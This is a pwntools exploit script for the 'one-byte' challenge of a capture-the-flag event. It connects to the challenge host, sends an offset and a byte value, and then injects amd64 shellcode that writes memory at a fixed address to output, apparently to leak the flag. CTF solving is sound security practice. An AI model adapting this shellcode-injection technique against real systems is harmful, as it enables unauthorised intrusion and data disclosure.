#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
if LOCAL:
    pass
else:
    io=remote("spaceheroes-one-byte.chals.io", 443, ssl=True, sni="spaceheroes-one-byte.chals.io")


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

ru(b'Leap >>>\n')
sl(i2b(0x1440))
ru(b'Byte >>>\n')
sl(i2b(0xff))
ru(b'Throw Your Sploit Space Hero >>> ')

shellcode = asm('''
    mov rdi, 1;
    mov rsi, 0x888800;
    mov rdx, 0x1000;
    mov rax, 1;
    syscall;
''')

s(shellcode)



ia()
